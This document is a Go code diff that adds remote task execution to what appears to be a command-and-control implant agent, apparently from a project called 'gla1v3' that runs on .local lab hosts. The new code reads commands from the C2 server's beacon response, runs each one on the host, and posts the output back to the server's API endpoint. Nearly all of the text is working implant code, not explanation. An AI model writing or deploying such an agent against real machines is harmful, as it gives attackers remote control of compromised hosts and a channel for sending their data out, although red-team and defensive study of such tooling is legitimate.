@@ -15,6 +15,72 @@ import (
 	"time"
 )
 
+// executeTask runs a task and sends the result back to C2
+func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args []string) {
+	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
+	
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	
+	var result string
+	var taskErr string
+	status := "completed"
+	
+	// Execute the command
+	execCmd := exec.CommandContext(ctx, cmd, args...)
+	output, err := execCmd.CombinedOutput()
+	
+	if err != nil {
+		taskErr = err.Error()
+		status = "failed"
+		log.Printf("Task %s failed: %v", taskID, err)
+	} else {
+		result = string(output)
+		if len(result) > 4096 {
+			result = result[:4096] + "...(truncated)"
+		}
+		log.Printf("Task %s completed successfully", taskID)
+	}
+	
+	// Send result back to C2
+	resultPayload := map[string]interface{}{
+		"result": result,
+		"error":  taskErr,
+		"status": status,
+	}
+	
+	resultBody, _ := json.Marshal(resultPayload)
+	
+	// Build result URL - replace /beacon with task result endpoint
+	resultURL := strings.Replace(c2URL, "/beacon", fmt.Sprintf("/api/agents/%s/tasks/%s/result", agentID, taskID), 1)
+	// Convert c2.gla1v3.local to api.gla1v3.local
+	resultURL = strings.Replace(resultURL, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
+	
+	resultReq, _ := http.NewRequest("POST", resultURL, bytes.NewReader(resultBody))
+	resultReq.Header.Set("Content-Type", "application/json")
+	
+	// Use a plain HTTPS client for API endpoint (not mTLS for results)
+	apiClient := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				RootCAs:    client.Transport.(*http.Transport).TLSClientConfig.RootCAs,
+				ServerName: "api.gla1v3.local",
+				MinVersion: tls.VersionTLS12,
+			},
+		},
+		Timeout: 10 * time.Second,
+	}
+	
+	resultResp, err := apiClient.Do(resultReq)
+	if err != nil {
+		log.Printf("Failed to send task result: %v", err)
+		return
+	}
+	defer resultResp.Body.Close()
+	
+	log.Printf("Task result sent: %s", resultResp.Status)
+}
+
 func main() {
 	// Cert paths (configurable)
 	// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames so a
@@ -320,6 +386,24 @@ func main() {
 			log.Printf("Beacon POST failed: %v", derr)
 		} else {
 			log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, agentID, seq)
+			
+			// Check for tasks in response
+			var taskResp struct {
+				Tasks []struct {
+					ID   string   `json:"id"`
+					Cmd  string   `json:"cmd"`
+					Args []string `json:"args"`
+				} `json:"tasks"`
+			}
+			
+			if err := json.NewDecoder(resp.Body).Decode(&taskResp); err == nil && len(taskResp.Tasks) > 0 {
+				log.Printf("Received %d tasks from C2", len(taskResp.Tasks))
+				
+				// Execute each task
+				for _, task := range taskResp.Tasks {
+					go executeTask(client, c2URL, agentID, task.ID, task.Cmd, task.Args)
+				}
+			}
 			resp.Body.Close()
 		}
 
